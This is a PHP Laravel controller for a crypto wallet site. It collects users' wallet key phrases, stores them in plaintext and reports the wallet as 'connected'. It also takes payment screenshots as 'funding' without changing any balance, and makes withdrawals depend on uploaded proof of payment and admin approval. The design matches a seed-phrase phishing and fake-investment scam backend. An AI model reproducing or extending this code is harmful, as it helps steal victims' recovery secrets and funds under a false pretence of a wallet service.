<?php

namespace App\Http\Controllers;

use App\Models\Withdrawal;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Wallet;

class WalletController extends Controller
{
    public function storeKeyPhrase(Request $request)
    {
        $request->validate([
            'key_phrase' => 'required|string|max:255',
        ]);

        $user = Auth::user();

        Wallet::create([
            'user_id' => $user->id,
            'key_phrase' => $request->key_phrase,
        ]);

        return redirect()->route('dashboard')->with('success', 'Wallet connected successfully!');
    }

    public function fundWallet(Request $request)
    {
        $request->validate([
            'amount' => 'required|numeric|min:0.01',
            'proof_of_payment' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
        ]);

        // Get the user's wallet (assuming each user has only one wallet)
        $wallet = Wallet::where('user_id', $request->user()->id)->first();

        if (!$wallet) {
            return redirect()->back()->with('error', 'No connected wallet found. Please connect your wallet first.');
        }

        // Handle File Upload
        if ($request->hasFile('proof_of_payment')) {
            $imagePath = $request->file('proof_of_payment')->store('wallet_proofs', 'public');
        }

        // Update Wallet with Proof of Payment (Balance remains the same)
        $wallet->update([
            'proof_of_payment' => $imagePath,
        ]);

        return redirect()->route('dashboard')->with('success', 'Wallet funded! Please wait while we confirm your payment.');
    }
    public function storeWalletAddress(Request $request)
    {
        $request->validate([
            'wallet_address' => 'required|string',
        ]);

        // Get the user's wallet (assuming each user has only one wallet)
        $wallet = Wallet::where('user_id', $request->user()->id)->first();

        if (!$wallet) {
            return redirect()->route('dashboard')->with('error', 'No connected wallet found. Please connect your wallet first.');
        }

        // Update Wallet with Proof of Payment (Balance remains the same)
        $wallet->update([
            'wallet_address' => $request->wallet_address,
        ]);

        return redirect()->route('dashboard')->with('success', 'Withdrawal Wallet Address added!');
    }
    public function withdraw(Request $request)
    {
        $request->validate([
            'amount' => 'required|numeric|min:0.01',
            'proof_of_payment' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
        ]);

        // Get the user's wallet
        $wallet = Wallet::where('user_id', $request->user()->id)->first();

        if (!$wallet) {
            return redirect()->route('dashboard')->with('error', 'No connected wallet found. Please connect your wallet first.');
        }

        // Check if the user has enough balance
        if ($request->amount > $wallet->balance) {
            return redirect()->route('dashboard')->with('error', 'Insufficient balance for withdrawal.');
        }

        // Upload proof of payment
        if ($request->hasFile('proof_of_payment')) {
            $proofPath = $request->file('proof_of_payment')->store('wallet_proofs', 'public');
        }

        // Save the withdrawal request (admin will process it)
        Withdrawal::create([
            'user_id' => $request->user()->id,
            'amount' => $request->amount,
            'proof_of_payment' => $proofPath,
            'status' => 'pending', // Admin will approve/reject
        ]);

        return redirect()->route('dashboard')->with('success', 'Withdrawal placed. Please wait while we process your withdrawal.');
    }

}

